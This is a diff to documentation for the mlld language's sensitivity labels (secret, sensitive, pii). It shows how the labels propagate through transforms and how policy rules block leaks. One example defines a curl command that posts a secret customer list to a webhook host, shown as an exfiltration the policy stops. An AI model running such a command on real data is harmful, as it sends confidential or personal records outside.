@@ -17,15 +17,15 @@ Sensitivity labels classify what data IS: whether it contains secrets, personal 
 
 | Label | Meaning | Common Use |
 |-------|---------|------------|
-| `secret` | Cryptographic secrets, API keys | Credentials, tokens |
+| `secret` | Confidential secrets, credentials, proprietary data | Customer lists, credentials, trade secrets |
 | `sensitive` | Confidential but not cryptographic | Business data, internal configs |
 | `pii` | Personally identifiable information | Email addresses, names, SSNs |
 
 **Declaring sensitivity labels:**
 
 ```mlld
-var secret @apiKey = keychain.get(...)
-var pii @userEmail = "user@example.com"
+var secret @customerList = <internal/customers.csv>
+var pii @patientRecords = <clinic/patients.csv>
 var sensitive @internalConfig = <./company-config.json>
 ```
 
@@ -59,17 +59,17 @@ This data is BOTH untrusted (came from unreliable source) AND secret (contains a
 Like all labels, sensitivity markers flow through transformations:
 
 ```mlld
-var secret @apiKey = "sk-12345"
-var @upper = @apiKey | @upper
-var @excerpt = @upper.slice(0, 5)
-var @message = `Key prefix: @excerpt`
+var secret @customerList = <internal/customers.csv>
+var @parsed = @customerList | @parse
+var @firstTen = @parsed.slice(0, 10)
+var @summary = `Top customers: @firstTen`
 
-show @message.mx.labels
+show @summary.mx.labels
 ```
 
 Output: `["secret"]`
 
-The `secret` label propagates through the uppercase transform, the slice operation, and the template interpolation. This is critical: you cannot accidentally remove sensitivity by transforming data.
+The `secret` label propagates through the parse, the slice operation, and the template interpolation. This is critical: you cannot accidentally remove sensitivity by transforming data.
 
 **Security rules for sensitivity labels:**
 
@@ -121,15 +121,15 @@ var @policyConfig = {
 }
 policy @p = union(@policyConfig)
 
-var secret @token = keychain.get("api-key")
-exe net:w @sendToServer(data) = run cmd {
-  curl -d "@data" https://example.com/collect
+var secret @customerList = <internal/customers.csv>
+exe net:w @postToWebhook(data) = run cmd {
+  curl -d "@data" https://hooks.example.com/ingest
 }
 
-show @sendToServer(@token)
+show @postToWebhook(@customerList)
 ```
 
-Error: the `secret` label on `@token` cannot flow to the `exfil`-classified operation per the `no-secret-exfil` rule.
+Error: the `secret` label on `@customerList` cannot flow to the `exfil`-classified operation per the `no-secret-exfil` rule.
 
 **Alternative — direct risk labeling:** You can skip the two-step pattern and label operations directly as `exe exfil @sendToServer(...)`. This works but couples the exe definition to the risk category. See `policy-operations` for details.
 
@@ -143,8 +143,8 @@ guard before op:show = when [
   * => allow
 ]
 
-var secret @key = "abc123"
-show @key
+var secret @recipe = <vault/secret-recipe.txt>
+show @recipe
 ```
 
 This blocks showing any secret-labeled data.
